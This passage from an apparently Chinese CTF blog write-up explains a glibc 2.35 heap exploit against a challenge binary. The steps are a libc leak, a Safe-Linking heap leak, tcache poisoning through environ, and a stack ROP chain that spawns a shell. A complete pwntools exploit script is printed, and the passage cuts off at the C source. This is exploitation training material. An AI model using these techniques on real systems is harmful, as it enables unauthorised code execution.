*((_QWORD *)&amp;unk_4060 + n9) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4060 + n9));</span><br><span class="line">    <span class="keyword">return</span> n9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><p>这是一个非常经典的针对 <strong>glibc 2.35</strong> 环境的堆溢出&#x2F;UAF（Use-After-Free）漏洞利用脚本。</p>
+<p>在 glibc 2.35 中，漏洞利用主要面临两个巨大的挑战：</p>
+<ol>
+<li><strong>移除了所有的 Hook 函数</strong>：去掉了 <code>__malloc_hook</code>、<code>__free_hook</code> 等，这意味着我们无法再通过简单地劫持堆相关的函数指针来拿 shell，必须转而寻找其他目标（如栈上的返回地址、<code>_IO_FILE</code> 结构等）。</li>
+<li><strong>引入了 Safe-Linking（安全链接）</strong>：Tcache 和 Fastbin 的 <code>fd</code> 指针被异或加密了，</li>
+<li>公式为 mangled_ptr &#x3D; ( L ≫ 12 ) ^ P （L 为当前 chunk 的地址，P 为原本指向的地址）。</li>
+</ol>
+<p>这份脚本的总体思路非常清晰：<strong>泄露 libc 基址 → 泄露 Heap 基址（绕过 Safe-Linking） → 劫持 tcache 读出 <strong><code><strong>environ</strong></code></strong> 从而泄露栈地址 → 劫持 tcache 修改栈上的返回地址（ROP）</strong>。</p>
+<h4 id="1-泄露-Libc-基址-Unsorted-Bin-泄露"><a href="#1-泄露-Libc-基址-Unsorted-Bin-泄露" class="headerlink" title="1. 泄露 Libc 基址 (Unsorted Bin 泄露)"></a>1. 泄露 Libc 基址 (Unsorted Bin 泄露)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;A&#x27;</span>)  <span class="comment"># 申请一个超出 tcache 范围的 chunk (idx 0)</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)   <span class="comment"># 隔离 chunk 1-4，防止 free 时与 top chunk 合并</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)            <span class="comment"># 释放 idx 0，由于其大小超过 tcache，会进入 Unsorted Bin</span></span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>) <span class="comment"># 重新申请回来</span></span><br><span class="line">show(<span class="number">0</span>)              <span class="comment"># 打印内容，泄露 main_arena 相关的 libc 地址</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) </span><br><span class="line">log.success(<span class="string">f&#x27;main_arena is <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">environ = main_arena + <span class="number">0x7520</span></span><br><span class="line">success(<span class="string">&#x27;environ =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">libcbase = environ - libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">sys = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line">rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libcbase + <span class="number">0x29139</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们可以通过 unsortedbin 连的 main_arena 寻找 environ 的地址：</li>
+</ul>
+<p>查找 main_arena + 96 和 environ 的偏移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distance <span class="number">0x7fd636c1ace0</span> &amp;environ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776701633309-60799f92-3c6a-4036-afc6-46c108dd17b0-197626.png" alt="1776701633309-60799f92-3c6a-4036-afc6-46c108dd17b0.png"></p>
+<ul>
+<li>释放大小超过 0x408 的 chunk 时，它会被放入 Unsorted Bin。此时它的 fd 和 bk 指针会指向 libc 内部的 main_arena。重新申请回来并通过打印，可以带出这个 libc 地址.</li>
+</ul>
+<p>还有一种方法是直接去计算偏移：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc.so<span class="number">.6</span> | grep environ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776701791315-63d22fea-7184-417d-8685-c78f7363c975-983841.png" alt="1776701791315-63d22fea-7184-417d-8685-c78f7363c975.png"></p>
+<p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776702020854-ad25e290-ba98-4992-9c8a-f11cb8b96591-173440.png" alt="1776702020854-ad25e290-ba98-4992-9c8a-f11cb8b96591.png"></p>
+<h4 id="2-泄露堆基址-绕过-Safe-Linking"><a href="#2-泄露堆基址-绕过-Safe-Linking" class="headerlink" title="2. 泄露堆基址 (绕过 Safe-Linking)"></a>2. 泄露堆基址 (绕过 Safe-Linking)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) * <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&#x27;heap ==&gt; &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>由于脚本中利用了 UAF 漏洞，它打印了刚刚被释放到 tcache 中的 chunk 2 的 fd 指针。</li>
+<li>根据 Safe-Linking 机制，链表末端的 chunk 其原始 fd 应该是 0。所以被加密后的指针值为</li>
+</ul>
+<p><code>( HeapBase ≫ 12 ) ⊕ 0 = HeapBase ≫ 12</code>。</p>
+<ul>
+<li>脚本拿到这个值后，直接乘以 0x1000（等价于左移 12 位），就完美还原出了当前堆块所在的页面基址。有了这个基址，我们就可以随时伪造 Safe-Linking 的加密指针了。</li>
+</ul>
+<h4 id="3-利用堆溢出-UAF-构造-Chunk-Overlap"><a href="#3-利用堆溢出-UAF-构造-Chunk-Overlap" class="headerlink" title="3. 利用堆溢出&#x2F;UAF 构造 Chunk Overlap"></a>3. 利用堆溢出&#x2F;UAF 构造 Chunk Overlap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用了 edit 函数存在的堆溢出漏洞，修改了紧随其后的 chunk 2 的 <code>size</code> 字段，将其从 0x21 改成了 0x41。然后释放再申请回来，这使得原本属于 chunk 3 的内存区域现在被包含在新的 chunk 2 内，形成了 Chunk Overlap，为后续的 Tcache Poisoning 打下基础。</li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776773662592-d3c86d65-5371-4d53-9932-967d3e1826e5-245070.png" alt="1776773662592-d3c86d65-5371-4d53-9932-967d3e1826e5.png"></p>
+<h4 id="4-泄露栈地址-利用-environ"><a href="#4-泄露栈地址-利用-environ" class="headerlink" title="4. 泄露栈地址 (利用 environ)"></a>4. 泄露栈地址 (利用 environ)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (environ - <span class="number">0x10</span>)))</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因为 glibc 2.35 删除了 __free_hook，我们无法直接劫持 free，最简单的办法就是修改栈上的函数返回地址。而要知道栈的地址，必须去读取 libc 中 environ 变量存储的栈指针。</li>
+<li><strong>Tcache Poisoning</strong>：上面的 <code>add</code> 写入了伪造的 <code>fd</code>：<code>p64((heap &gt;&gt; 12) ^ (environ - 0x10))</code>。注意这里严格遵循了 Safe-Linking 的加密规则，将目标地址 <code>environ - 0x10</code> 进行了异或加密。</li>
+<li>这里把 fd 申请到了 environ - 0x10，是因为 因为当你通过 malloc 拿到一块内存时，指针是跳过 Chunk 头部的 16 字节的。我们将伪造的 Chunk 头部定在 environ - 0x10，这样后续 malloc 返回的用户区指针，就精准无误地落在了 <code>environ</code> 变量上。</li>
+<li>随后两次申请，将 tcache 链表引导到了 <code>environ</code> 变量所在的内存附近，通过 <code>show(4)</code> 成功读取了其中的栈指针。</li>
+</ul>
+<h4 id="5-计算栈指针"><a href="#5-计算栈指针" class="headerlink" title="5. 计算栈指针"></a>5. 计算栈指针</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stack1 = u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;stack1 =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(stack1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">stack = stack1 - <span class="number">0x120</span></span><br><span class="line">success(<span class="string">&#x27;stack =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776775912191-2797f673-5d09-404c-b803-f092aff83fba-740788.png" alt="1776775912191-2797f673-5d09-404c-b803-f092aff83fba.png"></p>
+<p>泄露出的 stack1 就是通过 environ 返回到栈上的值。</p>
+<p>当 main 函数结束后，就会弹出返回地址 0x7ffd3bb7a148 —▸ 0x7fea09629d90 ◂— mov edi, eax，此时程序就会跳回到 libc 当中的 __libc_start_call_main 函数。在 libc 接管之后，就会执行 mov edi，eax，把刚才 main 函数返回的 0 转移到 edi 当中，随后作为 exit(0)的参数。</p>
+<h4 id="6-在栈上布置-ROP-链"><a href="#6-在栈上布置-ROP-链" class="headerlink" title="6. 在栈上布置 ROP 链"></a>6. 在栈上布置 ROP 链</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一次 Tcache 投毒，目标地址是：栈的返回地址 stack - 8</span></span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (stack - <span class="number">8</span>)))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(rdi) + p64(bin_sh))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p64(0)：写在 stack - 8 处，无实际意义，纯粹为了占位和绕过对齐检查（通常会覆盖掉 saved RBP 的高位）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p64(rdi)：刚好落在 stack 处！这精准覆盖了 main 函数的真实返回地址。劫持了执行流。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p64(bin_sh)：写在 stack + 8 处，这是为前面的 pop rdi 准备的参数。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次 Tcache 投毒，目标地址是：stack + 8</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (stack + <span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(bin_sh) + p64(ret) + p64(sys))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p64(bin_sh)：写在 stack + 8。由于前一次操作已经写过一次了，这里只是为了占位，重新覆盖一次相同的值，保证栈数据的连续性。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p64(ret)：写在 stack + 16。增加一个单纯的 ret 指令，是为了栈对齐（Stack Alignment）。Ubuntu 下调用 system 时，要求 RSP 必须是 16 字节对齐的，否则内部调用 movaps 指令时会直接 Segment Fault。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p64(sys)：写在 stack + 24。真正的终极目标 system() 函数地址。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>原理</strong>：两次重复了 Tcache 投毒的操作，将堆块直接申请到了栈上（<code>stack - 8</code> 和 <code>stack + 8</code>）。</li>
+<li>在栈上写入了一段经典的 ROP 链：pop rdi; ret→&amp;”&#x2F;bin&#x2F;sh”→ret (用于栈对齐) →system()。</li>
+</ul>
+<h4 id="7-触发-ROP"><a href="#7-触发-ROP" class="headerlink" title="7. 触发 ROP"></a>7. 触发 ROP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发送 <code>5</code> 应该是触发菜单中的 <code>Exit</code>（退出）功能。</li>
+<li>此时程序执行 <code>return</code>，但原本的返回地址已经被上述的 ROP 链覆盖。程序不会正常返回，而是会去执行 <code>system(&quot;/bin/sh&quot;)</code>，从而成功 get shell。</li>
+</ul>
+<hr>
+<p><strong>总结：</strong></p>
+<p>这是一个非常标准且熟练的高版本 glibc 堆利用模板。作者对 Safe-Linking 的加解密、<code>environ</code> 的妙用以及通过 Tcache 劫持栈执行流的手法运用得非常纯熟。</p>
+<p>如果您正在学习高版本堆利用，你希望我再详细解释一下 <strong>Safe-Linking</strong> 的底层机制，或者探讨一下除了修改返回地址外，glibc 2.35 还有哪些常见的攻击面（比如 <code>_IO_FILE</code> 的劫持）吗？</p>
+<h3 id="总-EXP"><a href="#总-EXP" class="headerlink" title="总 EXP:"></a>总 EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./chaos_plus&#x27;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Choice:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Input Size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;Content of Chaos!:\n&#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Choice:\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Input index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Choice:\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Input index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;Change Chaos Content:\n&#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Choice:\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Please Input index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">environ = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) + <span class="number">0x7520</span></span><br><span class="line">success(<span class="string">&#x27;environ =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">libcbase = environ - libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">sys = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line">rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libcbase + <span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) * <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&#x27;heap ==&gt; &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (environ - <span class="number">0x10</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x120</span></span><br><span class="line">success(<span class="string">&#x27;stack =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (stack - <span class="number">8</span>)))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(rdi) + p64(bin_sh))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64((heap &gt;&gt; <span class="number">12</span>) ^ (stack + <span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(bin_sh) + p64(ret) + p64(sys))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="C-源代码："><a href="#C-源代码：" class="headerlink" title="C 源代码："></a>C 源代码：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 